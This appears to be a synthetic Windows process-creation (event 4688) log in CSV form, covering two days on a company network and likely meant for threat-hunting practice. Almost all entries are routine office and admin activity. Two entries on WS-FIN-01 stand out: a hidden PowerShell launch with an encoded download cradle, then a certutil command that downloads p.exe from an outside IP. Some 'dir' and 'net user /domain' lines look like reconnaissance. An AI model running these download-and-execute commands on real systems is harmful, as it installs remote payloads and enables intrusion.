+2026-11-13 10:14:45,4688,101106,WS-ENG-08,vikram.shetty,C:\Windows\System32\splwow64.exe,C:\Windows\System32\winword.exe,C:\Windows\splwow64.exe 12288
+2026-11-13 10:18:29,4688,101108,WS-IT-01,admin01,C:\Windows\System32\chrome.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe"""
+2026-11-13 10:20:40,4688,101109,WS-HR-07,manoj.verma,C:\Windows\System32\excel.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE"""
+2026-11-13 10:31:07,4688,101110,WS-OPS-05,naveen.das,C:\Windows\System32\splwow64.exe,C:\Windows\System32\winword.exe,C:\Windows\splwow64.exe 12288
+2026-11-13 10:34:53,4688,101111,WS-SALES-09,shalini.kulkarni,C:\Windows\System32\chrome.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe"""
+2026-11-13 10:35:53,4688,101112,WS-SALES-04,pooja.gupta,C:\Windows\System32\splwow64.exe,C:\Windows\System32\winword.exe,C:\Windows\splwow64.exe 12288
+2026-11-13 10:42:26,4688,101113,WS-FIN-11,suresh.kulkarni,C:\Windows\System32\chrome.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe"""
+2026-11-13 10:42:58,4688,101114,WS-HR-02,harish.kulkarni,C:\Windows\System32\excel.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE"""
+2026-11-13 10:44:27,4688,101115,WS-FIN-11,suresh.kulkarni,C:\Windows\System32\chrome.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe"""
+2026-11-13 10:55:30,4688,101116,WS-IT-01,admin01,C:\Windows\System32\winword.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"""
+2026-11-13 11:02:39,4688,101117,WS-FIN-11,suresh.kulkarni,C:\Windows\System32\chrome.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe"""
+2026-11-13 11:04:36,4688,101118,WS-FIN-11,suresh.kulkarni,C:\Windows\System32\cmd.exe,C:\Windows\System32\explorer.exe,cmd.exe /c dir C:\Users
+2026-11-13 11:05:56,4688,101119,WS-SALES-09,shalini.kulkarni,C:\Windows\System32\splwow64.exe,C:\Windows\System32\winword.exe,C:\Windows\splwow64.exe 12288
+2026-11-13 11:08:03,4688,101120,WS-ENG-03,rohan.iyer,C:\Windows\System32\onedrive.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft OneDrive\OneDrive.exe"" /background"
+2026-11-13 11:15:07,4688,101123,WS-OPS-05,naveen.das,C:\Windows\System32\onedrive.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft OneDrive\OneDrive.exe"" /background"
+2026-11-13 11:16:07,4688,101124,DC01,admin02,C:\Windows\System32\cmd.exe,C:\Windows\System32\explorer.exe,cmd.exe /c ipconfig /all
+2026-11-13 11:18:54,4688,101125,WS-HR-07,manoj.verma,C:\Windows\System32\notepad.exe,C:\Windows\System32\explorer.exe,notepad.exe
+2026-11-13 11:19:43,4688,101126,WS-SALES-04,pooja.gupta,C:\Windows\System32\winword.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"""
+2026-11-13 11:21:08,4688,101127,WS-ENG-08,vikram.shetty,C:\Windows\System32\teams.exe,C:\Windows\System32\explorer.exe,"""C:\Users\Public\Teams\current\Teams.exe"""
+2026-11-13 11:22:16,4688,101128,WS-OPS-05,naveen.das,C:\Windows\System32\teams.exe,C:\Windows\System32\explorer.exe,"""C:\Users\Public\Teams\current\Teams.exe"""
+2026-11-13 11:25:28,4688,101129,WS-ENG-08,vikram.shetty,C:\Windows\System32\chrome.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe"""
+2026-11-13 11:31:41,4688,101131,WS-FIN-06,shalini.bose,C:\Windows\System32\splwow64.exe,C:\Windows\System32\winword.exe,C:\Windows\splwow64.exe 12288
+2026-11-13 11:36:29,4688,101132,WS-SALES-09,shalini.kulkarni,C:\Windows\System32\outlook.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE"""
+2026-11-13 11:44:09,4688,101134,WS-ENG-03,manoj.kulkarni,C:\Windows\System32\winword.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"""
+2026-11-13 11:44:11,4688,101135,WS-FIN-06,shalini.bose,C:\Windows\System32\notepad.exe,C:\Windows\System32\explorer.exe,notepad.exe
+2026-11-13 11:49:18,4688,101137,WS-FIN-06,manoj.iyer,C:\Windows\System32\cmd.exe,C:\Windows\System32\explorer.exe,cmd.exe /c dir C:\Users
+2026-11-13 11:56:24,4688,101139,WS-ENG-03,rohan.iyer,C:\Windows\System32\chrome.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe"""
+2026-11-13 11:57:20,4688,101140,WS-SALES-04,naveen.bose,C:\Windows\System32\onedrive.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft OneDrive\OneDrive.exe"" /background"
+2026-11-13 12:00:15,4688,101141,WS-ENG-03,manoj.kulkarni,C:\Windows\System32\outlook.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE"""
+2026-11-13 12:02:12,4688,101144,WS-ENG-08,vikram.shetty,C:\Windows\System32\cmd.exe,C:\Windows\System32\explorer.exe,cmd.exe /c dir C:\Users
+2026-11-13 12:03:40,4688,101145,WS-OPS-05,naveen.das,C:\Windows\System32\chrome.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe"""
+2026-11-13 12:07:58,4688,101146,WS-HR-07,manoj.verma,C:\Windows\System32\notepad.exe,C:\Windows\System32\explorer.exe,notepad.exe
+2026-11-13 12:08:14,4688,101147,WS-FIN-01,priya.shetty,C:\Windows\System32\excel.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE"""
+2026-11-13 12:17:40,4688,101148,WS-SALES-04,pooja.gupta,C:\Windows\System32\onedrive.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft OneDrive\OneDrive.exe"" /background"
+2026-11-13 12:17:52,4688,101149,WS-HR-02,harish.kulkarni,C:\Windows\System32\notepad.exe,C:\Windows\System32\explorer.exe,notepad.exe
+2026-11-13 12:18:59,4688,101150,WS-IT-01,admin01,C:\Windows\System32\notepad.exe,C:\Windows\System32\explorer.exe,notepad.exe
+2026-11-13 12:25:43,4688,101151,WS-FIN-01,priya.shetty,C:\Windows\System32\cmd.exe,C:\Windows\System32\explorer.exe,cmd.exe /c dir C:\Users
+2026-11-13 12:26:19,4688,101152,WS-HR-07,nisha.gupta,C:\Windows\System32\outlook.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE"""
+2026-11-13 12:42:55,4688,101155,WS-ENG-03,rohan.iyer,C:\Windows\System32\splwow64.exe,C:\Windows\System32\winword.exe,C:\Windows\splwow64.exe 12288
+2026-11-13 12:46:06,4688,101156,WS-FIN-06,shalini.bose,C:\Windows\System32\notepad.exe,C:\Windows\System32\explorer.exe,notepad.exe
+2026-11-13 12:47:07,4688,101157,WS-SALES-04,pooja.gupta,C:\Windows\System32\outlook.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE"""
+2026-11-13 12:49:43,4688,101158,WS-SALES-04,naveen.bose,C:\Windows\System32\cmd.exe,C:\Windows\System32\explorer.exe,cmd.exe /c dir C:\Users
+2026-11-13 12:52:47,4688,101159,WS-ENG-03,rohan.iyer,C:\Windows\System32\chrome.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe"""
+2026-11-13 12:52:59,4688,101162,WS-SALES-04,naveen.bose,C:\Windows\System32\teams.exe,C:\Windows\System32\explorer.exe,"""C:\Users\Public\Teams\current\Teams.exe"""
+2026-11-13 12:56:01,4688,101163,WS-SALES-09,shalini.kulkarni,C:\Windows\System32\winword.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"""
+2026-11-13 13:02:56,4688,101177,DC01,admin01,C:\Windows\System32\mmc.exe,C:\Windows\System32\explorer.exe,mmc.exe C:\Windows\system32\dsa.msc
+2026-11-13 13:09:45,4688,101181,FIN-SRV01,admin02,C:\Windows\System32\gpmc.msc,C:\Windows\System32\explorer.exe,C:\Windows\system32\gpmc.msc
+2026-11-13 13:15:23,4688,101182,WS-IT-02,admin02,C:\Windows\System32\onedrive.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft OneDrive\OneDrive.exe"" /background"
+2026-11-13 13:20:12,4688,101185,WS-FIN-06,manoj.iyer,C:\Windows\System32\cmd.exe,C:\Windows\System32\explorer.exe,cmd.exe /c dir C:\Users
+2026-11-13 13:27:29,4688,101187,WS-IT-01,admin01,C:\Windows\System32\onedrive.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft OneDrive\OneDrive.exe"" /background"
+2026-11-13 13:31:05,4688,101189,WS-ENG-03,manoj.kulkarni,C:\Windows\System32\excel.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE"""
+2026-11-13 13:32:50,4688,101190,WS-HR-02,harish.kulkarni,C:\Windows\System32\notepad.exe,C:\Windows\System32\explorer.exe,notepad.exe
+2026-11-13 13:34:21,4688,101191,WS-SALES-04,pooja.gupta,C:\Windows\System32\notepad.exe,C:\Windows\System32\explorer.exe,notepad.exe
+2026-11-13 13:44:36,4688,101193,WS-SALES-04,naveen.bose,C:\Windows\System32\winword.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"""
+2026-11-13 13:49:49,4688,101194,WS-FIN-01,priya.shetty,C:\Windows\System32\onedrive.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft OneDrive\OneDrive.exe"" /background"
+2026-11-13 13:49:56,4688,101195,WS-HR-07,manoj.verma,C:\Windows\System32\splwow64.exe,C:\Windows\System32\winword.exe,C:\Windows\splwow64.exe 12288
+2026-11-13 13:50:16,4688,101196,WS-ENG-03,manoj.kulkarni,C:\Windows\System32\teams.exe,C:\Windows\System32\explorer.exe,"""C:\Users\Public\Teams\current\Teams.exe"""
+2026-11-13 13:53:10,4688,101197,WS-HR-07,nisha.gupta,C:\Windows\System32\notepad.exe,C:\Windows\System32\explorer.exe,notepad.exe
+2026-11-13 13:58:59,4688,101198,WS-SALES-04,naveen.bose,C:\Windows\System32\teams.exe,C:\Windows\System32\explorer.exe,"""C:\Users\Public\Teams\current\Teams.exe"""
+2026-11-13 14:10:28,4688,101199,WS-FIN-01,karthik.pillai,C:\Windows\System32\chrome.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe"""
+2026-11-13 14:12:30,4688,101200,WS-ENG-03,rohan.iyer,C:\Windows\System32\splwow64.exe,C:\Windows\System32\winword.exe,C:\Windows\splwow64.exe 12288
+2026-11-13 14:13:17,4688,101201,WS-SALES-04,pooja.gupta,C:\Windows\System32\cmd.exe,C:\Windows\System32\explorer.exe,cmd.exe /c dir C:\Users
+2026-11-13 14:14:08,4688,101202,WS-SALES-04,pooja.gupta,C:\Windows\System32\splwow64.exe,C:\Windows\System32\winword.exe,C:\Windows\splwow64.exe 12288
+2026-11-13 14:18:19,4688,101203,WS-HR-07,nisha.gupta,C:\Windows\System32\teams.exe,C:\Windows\System32\explorer.exe,"""C:\Users\Public\Teams\current\Teams.exe"""
+2026-11-13 14:20:01,4688,101204,WS-SALES-09,shalini.kulkarni,C:\Windows\System32\cmd.exe,C:\Windows\System32\explorer.exe,cmd.exe /c dir C:\Users
+2026-11-13 14:20:08,4688,101205,WS-HR-07,manoj.verma,C:\Windows\System32\splwow64.exe,C:\Windows\System32\winword.exe,C:\Windows\splwow64.exe 12288
+2026-11-13 14:27:03,4688,101206,WS-ENG-03,rohan.iyer,C:\Windows\System32\teams.exe,C:\Windows\System32\explorer.exe,"""C:\Users\Public\Teams\current\Teams.exe"""
+2026-11-13 14:28:29,4688,101207,WS-FIN-01,karthik.pillai,C:\Windows\System32\excel.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE"""
+2026-11-13 14:33:04,4688,101208,WS-ENG-08,vikram.shetty,C:\Windows\System32\notepad.exe,C:\Windows\System32\explorer.exe,notepad.exe
+2026-11-13 14:35:57,4688,101210,WS-SALES-04,naveen.bose,C:\Windows\System32\winword.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"""
+2026-11-13 14:40:38,4688,101211,WS-IT-01,admin01,C:\Windows\System32\msedge.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"""
+2026-11-13 14:42:12,4688,101212,WS-OPS-05,naveen.das,C:\Windows\System32\cmd.exe,C:\Windows\System32\explorer.exe,cmd.exe /c dir C:\Users
+2026-11-13 14:53:05,4688,101213,WS-FIN-11,suresh.kulkarni,C:\Windows\System32\winword.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"""
+2026-11-13 15:11:47,4688,101214,WS-HR-07,manoj.verma,C:\Windows\System32\excel.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE"""
+2026-11-13 15:17:22,4688,101216,WS-FIN-11,suresh.kulkarni,C:\Windows\System32\winword.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"""
+2026-11-13 15:24:28,4688,101217,WS-IT-02,admin02,C:\Windows\System32\teams.exe,C:\Windows\System32\explorer.exe,"""C:\Users\Public\Teams\current\Teams.exe"""
+2026-11-13 15:29:23,4688,101218,WS-IT-01,admin01,C:\Windows\System32\onedrive.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft OneDrive\OneDrive.exe"" /background"
+2026-11-13 15:43:47,4688,101226,WS-ENG-08,vikram.shetty,C:\Windows\System32\notepad.exe,C:\Windows\System32\explorer.exe,notepad.exe
+2026-11-13 15:45:55,4688,101227,DC01,admin02,C:\Windows\System32\gpmc.msc,C:\Windows\System32\explorer.exe,C:\Windows\system32\gpmc.msc
+2026-11-13 15:51:25,4688,101230,WS-ENG-03,manoj.kulkarni,C:\Windows\System32\msedge.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"""
+2026-11-13 15:52:47,4688,101231,WS-FIN-01,karthik.pillai,C:\Windows\System32\splwow64.exe,C:\Windows\System32\winword.exe,C:\Windows\splwow64.exe 12288
+2026-11-13 15:54:55,4688,101232,WS-ENG-03,manoj.kulkarni,C:\Windows\System32\excel.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE"""
+2026-11-13 15:56:09,4688,101233,SQL01,admin01,C:\Windows\System32\cmd.exe,C:\Windows\System32\explorer.exe,cmd.exe /c net user /domain
+2026-11-13 16:00:18,4688,101234,WS-HR-02,harish.kulkarni,C:\Windows\System32\outlook.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE"""
+2026-11-13 16:00:47,4688,101235,WS-ENG-03,manoj.kulkarni,C:\Windows\System32\notepad.exe,C:\Windows\System32\explorer.exe,notepad.exe
+2026-11-13 16:09:32,4688,101236,WS-HR-07,nisha.gupta,C:\Windows\System32\chrome.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe"""
+2026-11-13 16:10:22,4688,101237,WS-IT-02,admin02,C:\Windows\System32\excel.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE"""
+2026-11-13 16:15:01,4688,101239,WS-FIN-01,priya.shetty,C:\Windows\System32\cmd.exe,C:\Windows\System32\explorer.exe,cmd.exe /c dir C:\Users
+2026-11-13 16:17:45,4688,101240,WS-HR-02,sanjay.pillai,C:\Windows\System32\chrome.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe"""
+2026-11-13 16:21:42,4688,101243,WS-FIN-06,shalini.bose,C:\Windows\System32\cmd.exe,C:\Windows\System32\explorer.exe,cmd.exe /c dir C:\Users
+2026-11-13 16:23:11,4688,101244,WS-FIN-01,priya.shetty,C:\Windows\System32\excel.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE"""
+2026-11-13 16:26:44,4688,101246,FS01,admin02,C:\Windows\System32\mmc.exe,C:\Windows\System32\explorer.exe,mmc.exe C:\Windows\system32\dsa.msc
+2026-11-13 16:36:00,4688,101247,WS-IT-01,admin01,C:\Windows\System32\chrome.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe"""
+2026-11-13 16:37:22,4688,101248,WS-HR-02,sanjay.pillai,C:\Windows\System32\splwow64.exe,C:\Windows\System32\winword.exe,C:\Windows\splwow64.exe 12288
+2026-11-13 16:37:36,4688,101249,WS-HR-07,nisha.gupta,C:\Windows\System32\winword.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"""
+2026-11-13 16:39:57,4688,101250,WS-IT-01,admin01,C:\Windows\System32\winword.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"""
+2026-11-13 16:43:04,4688,101251,WS-SALES-09,shalini.kulkarni,C:\Windows\System32\onedrive.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft OneDrive\OneDrive.exe"" /background"
+2026-11-13 16:43:24,4688,101252,WS-SALES-04,pooja.gupta,C:\Windows\System32\msedge.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"""
+2026-11-13 16:47:29,4688,101253,WS-SALES-09,shalini.kulkarni,C:\Windows\System32\splwow64.exe,C:\Windows\System32\winword.exe,C:\Windows\splwow64.exe 12288
+2026-11-13 16:52:06,4688,101254,WS-FIN-01,karthik.pillai,C:\Windows\System32\winword.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"""
+2026-11-13 16:52:43,4688,101255,WS-ENG-08,vikram.shetty,C:\Windows\System32\outlook.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE"""
+2026-11-13 16:56:16,4688,101257,WS-OPS-05,naveen.das,C:\Windows\System32\cmd.exe,C:\Windows\System32\explorer.exe,cmd.exe /c dir C:\Users
+2026-11-13 17:00:22,4688,101259,WS-SALES-04,naveen.bose,C:\Windows\System32\onedrive.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft OneDrive\OneDrive.exe"" /background"
+2026-11-13 17:13:29,4688,101260,WS-FIN-06,manoj.iyer,C:\Windows\System32\chrome.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe"""
+2026-11-13 17:14:50,4688,101261,WS-IT-02,admin02,C:\Windows\System32\splwow64.exe,C:\Windows\System32\winword.exe,C:\Windows\splwow64.exe 12288
+2026-11-13 17:28:19,4688,101264,WS-SALES-04,pooja.gupta,C:\Windows\System32\notepad.exe,C:\Windows\System32\explorer.exe,notepad.exe
+2026-11-13 19:45:30,4688,101285,WS-OPS-10,priya.kumar,C:\Windows\System32\explorer.exe,C:\Windows\System32\userinit.exe,C:\Windows\Explorer.EXE
+2026-11-13 21:16:30,4688,101311,WS-OPS-05,karthik.bose,C:\Windows\System32\explorer.exe,C:\Windows\System32\userinit.exe,C:\Windows\Explorer.EXE
+2026-11-13 21:31:34,4688,101313,WS-FIN-01,priya.shetty,C:\Windows\System32\powershell.exe,C:\Windows\System32\cmd.exe,powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBi
+2026-11-13 21:33:57,4688,101314,WS-FIN-01,priya.shetty,C:\Windows\System32\certutil.exe,C:\Windows\System32\powershell.exe,certutil.exe -urlcache -split -f http://198.51.100.7/p.exe C:\Users\Public\p.exe
+2026-11-13 21:55:10,4688,101315,WS-OPS-05,karthik.bose,C:\Windows\System32\onedrive.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft OneDrive\OneDrive.exe"" /background"
+2026-11-13 22:04:04,4688,101316,WS-OPS-10,priya.kumar,C:\Windows\System32\teams.exe,C:\Windows\System32\explorer.exe,"""C:\Users\Public\Teams\current\Teams.exe"""
+2026-11-13 22:06:04,4688,101317,WS-OPS-10,priya.kumar,C:\Windows\System32\outlook.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE"""
+2026-11-13 22:38:16,4688,101319,WS-OPS-10,priya.kumar,C:\Windows\System32\onedrive.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft OneDrive\OneDrive.exe"" /background"
+2026-11-13 23:31:55,4688,101320,WS-OPS-10,priya.kumar,C:\Windows\System32\winword.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"""
+2026-11-14 00:19:49,4688,101324,WS-OPS-05,karthik.bose,C:\Windows\System32\onedrive.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft OneDrive\OneDrive.exe"" /background"
+2026-11-14 01:17:20,4688,101328,BKP01,svc_backup,C:\Windows\System32\wbadmin.exe,C:\Windows\System32\svchost.exe,wbadmin start backup -backupTarget:\\BKP01\Backups -include:\\FS01\Shares -quiet
+2026-11-14 01:20:12,4688,101329,WS-OPS-05,karthik.bose,C:\Windows\System32\cmd.exe,C:\Windows\System32\explorer.exe,cmd.exe /c dir C:\Users
+2026-11-14 01:27:36,4688,101330,WS-OPS-10,priya.kumar,C:\Windows\System32\splwow64.exe,C:\Windows\System32\winword.exe,C:\Windows\splwow64.exe 12288
+2026-11-14 01:53:02,4688,101331,WS-OPS-05,karthik.bose,C:\Windows\System32\msedge.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"""
+2026-11-14 01:58:40,4688,101332,WS-OPS-10,priya.kumar,C:\Windows\System32\onedrive.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft OneDrive\OneDrive.exe"" /background"
+2026-11-14 02:02:11,4688,101334,WS-OPS-05,karthik.bose,C:\Windows\System32\outlook.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE"""
+2026-11-14 02:36:41,4688,101336,WS-OPS-05,karthik.bose,C:\Windows\System32\notepad.exe,C:\Windows\System32\explorer.exe,notepad.exe
+2026-11-14 04:06:50,4688,101339,WS-OPS-05,karthik.bose,C:\Windows\System32\onedrive.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft OneDrive\OneDrive.exe"" /background"
+2026-11-14 05:31:10,4688,101340,WS-OPS-05,karthik.bose,C:\Windows\System32\winword.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"""
+2026-11-14 05:36:45,4688,101341,WS-OPS-05,karthik.bose,C:\Windows\System32\splwow64.exe,C:\Windows\System32\winword.exe,C:\Windows\splwow64.exe 12288
+2026-11-14 08:14:22,4688,101346,WS-ENG-08,vikram.shetty,C:\Windows\System32\explorer.exe,C:\Windows\System32\userinit.exe,C:\Windows\Explorer.EXE
+2026-11-14 08:21:11,4688,101348,WS-ENG-08,vikram.shetty,C:\Windows\System32\splwow64.exe,C:\Windows\System32\winword.exe,C:\Windows\splwow64.exe 12288
+2026-11-14 08:21:56,4688,101349,WS-ENG-08,vikram.shetty,C:\Windows\System32\excel.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE"""
+2026-11-14 08:27:29,4688,101351,WS-FIN-06,shalini.bose,C:\Windows\System32\explorer.exe,C:\Windows\System32\userinit.exe,C:\Windows\Explorer.EXE
+2026-11-14 08:45:12,4688,101354,WS-FIN-06,shalini.bose,C:\Windows\System32\teams.exe,C:\Windows\System32\explorer.exe,"""C:\Users\Public\Teams\current\Teams.exe"""
+2026-11-14 08:45:49,4688,101355,WS-ENG-08,vikram.shetty,C:\Windows\System32\teams.exe,C:\Windows\System32\explorer.exe,"""C:\Users\Public\Teams\current\Teams.exe"""
+2026-11-14 08:51:31,4688,101357,WS-FIN-06,shalini.bose,C:\Windows\System32\notepad.exe,C:\Windows\System32\explorer.exe,notepad.exe
+2026-11-14 09:10:49,4688,101358,WS-ENG-08,vikram.shetty,C:\Windows\System32\splwow64.exe,C:\Windows\System32\winword.exe,C:\Windows\splwow64.exe 12288
+2026-11-14 09:12:28,4688,101359,WS-FIN-06,shalini.bose,C:\Windows\System32\splwow64.exe,C:\Windows\System32\winword.exe,C:\Windows\splwow64.exe 12288
+2026-11-14 09:15:10,4688,101360,WS-FIN-06,shalini.bose,C:\Windows\System32\teams.exe,C:\Windows\System32\explorer.exe,"""C:\Users\Public\Teams\current\Teams.exe"""
+2026-11-14 09:22:08,4688,101361,WS-FIN-06,shalini.bose,C:\Windows\System32\winword.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"""
+2026-11-14 09:27:02,4688,101362,WS-FIN-06,shalini.bose,C:\Windows\System32\msedge.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"""
+2026-11-14 09:30:23,4688,101363,WS-FIN-06,shalini.bose,C:\Windows\System32\msedge.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"""
+2026-11-14 09:35:12,4688,101365,WS-ENG-08,vikram.shetty,C:\Windows\System32\onedrive.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft OneDrive\OneDrive.exe"" /background"
+2026-11-14 10:10:56,4688,101369,WS-ENG-08,vikram.shetty,C:\Windows\System32\onedrive.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft OneDrive\OneDrive.exe"" /background"
+2026-11-14 10:15:52,4688,101371,WS-FIN-01,priya.shetty,C:\Windows\System32\explorer.exe,C:\Windows\System32\userinit.exe,C:\Windows\Explorer.EXE
+2026-11-14 10:21:21,4688,101372,WS-FIN-01,priya.shetty,C:\Windows\System32\winword.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"""
+2026-11-14 10:27:13,4688,101373,WS-FIN-01,priya.shetty,C:\Windows\System32\excel.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE"""
+2026-11-14 10:27:52,4688,101374,WS-ENG-08,vikram.shetty,C:\Windows\System32\msedge.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"""
+2026-11-14 10:32:55,4688,101375,WS-ENG-08,vikram.shetty,C:\Windows\System32\onedrive.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft OneDrive\OneDrive.exe"" /background"
+2026-11-14 10:38:28,4688,101376,WS-FIN-01,priya.shetty,C:\Windows\System32\excel.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE"""
+2026-11-14 10:54:41,4688,101378,WS-FIN-01,priya.shetty,C:\Windows\System32\chrome.exe,C:\Windows\System32\explorer.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe"""
+2026-11-14 11:34:44,4688,101380,WS-FIN-01,priya.shetty,C:\Windows\System32\teams.exe,C:\Windows\System32\explorer.exe,"""C:\Users\Public\Teams\current\Teams.exe"""
+2026-11-14 11:44:41,4688,101381,WS-FIN-01,priya.shetty,C:\Windows\System32\teams.exe,C:\Windows\System32\explorer.exe,"""C:\Users\Public\Teams\current\Teams.exe"""
+2026-11-14 12:20:54,4688,101384,WS-FIN-01,priya.shetty,C:\Windows\System32\cmd.exe,C:\Windows\System32\explorer.exe,cmd.exe /c dir C:\Users
+2026-11-14 19:19:47,4688,101392,SQL01,admin01,C:\Windows\System32\powershell.exe,C:\Windows\System32\explorer.exe,powershell.exe -NoProfile -File C:\Scripts\sql_maintenance.ps1
+2026-11-14 19:23:47,4688,101393,SQL01,admin01,C:\Windows\System32\net.exe,C:\Windows\System32\powershell.exe,net stop MSSQLSERVER
+2026-11-14 19:26:47,4688,101394,SQL01,admin01,C:\Windows\System32\net.exe,C:\Windows\System32\powershell.exe,net start MSSQLSERVER
+2026-11-15 01:17:36,4688,101403,BKP01,svc_backup,C:\Windows\System32\wbadmin.exe,C:\Windows\System32\svchost.exe,wbadmin start backup -backupTarget:\\BKP01\Backups -include:\\FS01\Shares -quiet
+2026-11-15 08:22:38,4688,101408,WS-HR-02,sanjay.pillai,C:\Windows\System32\explorer.exe,C:\Windows\System32\userinit.exe,C:\Windows\Explorer.EXE
